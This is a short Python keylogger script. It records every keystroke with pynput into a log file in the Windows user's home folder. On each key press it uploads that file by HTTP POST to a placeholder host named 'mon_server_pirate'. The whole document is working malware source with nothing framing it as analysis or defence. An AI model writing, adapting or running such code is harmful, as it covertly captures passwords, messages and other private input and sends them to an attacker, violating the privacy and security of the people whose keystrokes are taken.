#!/usr/bin/env python
# coding: utf-8

import requests
import logging
import getpass
from pynput.keyboard import Key, Listener

log_dir = 'C:\\Users\\'+getpass.getuser()+'\\'

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    files = {'file': open(log_dir + "key_log.txt", 'rb')}
    requests.post("mon_server_pirate", files=files)

with Listener(on_press=on_press) as listener:
    listener.join()
